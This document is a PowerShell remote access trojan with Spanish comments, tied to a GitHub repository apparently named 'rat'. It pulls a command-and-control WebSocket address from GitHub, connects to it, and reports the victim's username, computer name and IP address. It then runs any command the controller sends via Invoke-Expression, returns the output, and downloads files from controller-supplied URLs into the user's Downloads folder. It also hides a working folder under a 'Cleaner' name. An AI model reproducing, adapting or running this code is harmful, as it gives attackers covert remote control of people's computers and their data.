

$CurrentScriptVersion = "1.0.2"
$VersionCheckUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/version"
$ScriptDownloadUrlTemplate = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1" 
$UriConfigUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"

$connectionTimeoutSeconds = 300 # Timeout para la conexión inicial y para ReceiveAsync
$reconnectDelaySeconds = 1      # Tiempo de espera mínimo entre intentos de reconexión

# --- COMIENZO DEL SCRIPT ---

# Agrega los ensamblados necesarios
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# --- OBTENER URI DESDE GITHUB ---
$uri = $null
while ($true) {
    try {
        Write-Host "Obteniendo WebSocket URI desde $UriConfigUrl..."
        # Usar -UseBasicParsing para Invoke-RestMethod en entornos sin Internet Explorer
        $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
        $uri = $uri.Trim()
        if ([string]::IsNullOrWhiteSpace($uri)) {
            throw "La URI obtenida está vacía o nula."
        }
        Write-Host "URI cargada: $uri"
        break
    } catch {
        Write-Warning "No se pudo obtener la URI del WebSocket. Error: $($_.Exception.Message)"
        Write-Host "Esperando conexión de red... reintentando en 10 segundos."
        Start-Sleep -Seconds 10
    }
}


# Connect WebSocket
while ($true) {
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    try {
        Write-Host "Conectando al WebSocket..."
        $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
        Write-Host "Conexión WebSocket establecida."
        break
    } catch {
        Write-Warning "No se pudo conectar al WebSocket. Error: $($_.Exception.Message)"
        Write-Host "Esperando red y reintentando en 10 segundos."
        Start-Sleep -Seconds 10
    }
}

# System data
$user = $env:USERNAME
$uid = "$env:COMPUTERNAME-$user"
$screenshotDir = Join-Path $env:APPDATA 'Cleaner\ss'
if (-not (Test-Path $screenshotDir)) {
    New-Item -ItemType Directory -Path $screenshotDir | Out-Null
}
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.254*" } | Select-Object -First 1 -ExpandProperty IPAddress)

function Send-Back($text) {
    try {
        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            Write-Host "WebSocket no está abierto"
            return
        }

        $bytes = [Text.Encoding]::UTF8.GetBytes($text)

        $task = $ws.SendAsync(
            [System.ArraySegment[byte]]::new($bytes),
            [System.Net.WebSockets.WebSocketMessageType]::Text,
            $true,
            [System.Threading.CancellationToken]::None
        )

        $task.Wait()
    }
    catch {
        Write-Host "Error real:"
        $_.Exception.InnerException
    }
}
# Connection notice
Send-Back "UID:$uid Conectado: $user $ip"

$buffer = New-Object byte[] 16384

try {
    while ($true) {

    $result = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None).Result
    if ($result.Count -le 0) { continue }

    $msg = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count).Trim()
    if ([string]::IsNullOrWhiteSpace($msg)) { continue }

    if ($msg.StartsWith("#")) {
        $spaceIndex = $msg.IndexOf(' ')
        if ($spaceIndex -gt 1) {
            $commandUid = $msg.Substring(1, $spaceIndex - 1)
            $msg = $msg.Substring($spaceIndex + 1).Trim()
            if ($commandUid -ne $uid) {
                continue
            }
        } else {
            continue
        }
    }

    # /help
    if ($msg -eq "/help") {
        Send-Back "Comandos disponibles:`n/help`n&dw <url>`n!<comando>"
        continue
    }

    # &download URL
    if ($msg.StartsWith("&dw ")) {
        try {
            $url = $msg.Substring(4).Trim()
            $file = Split-Path $url -Leaf
            $dest = "$env:USERPROFILE\Downloads\$file"
            Invoke-WebRequest $url -OutFile $dest -UseBasicParsing
            Send-Back "Descarga completada: $dest"
        } catch {
            Send-Back "Error en descarga"
        }
        continue
    }

    # !comando → executes only if it starts with !
    if ($msg.StartsWith("!")) {
        $command = $msg.Substring(1)
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            if ([string]::IsNullOrWhiteSpace($output)) {
                $output = "[sin salida]"
            }
            Send-Back $output
        } catch {
            Send-Back "[comando inválido o error ejecutando comando]"
        }
    }
    }
}
finally {
    try {
        Send-Back "UID:$uid CLOSING"
    } catch {}

    if ($ws -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        $ws.CloseAsync(
            [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
            "Closing",
            [System.Threading.CancellationToken]::None
        ).Wait()
    }
}
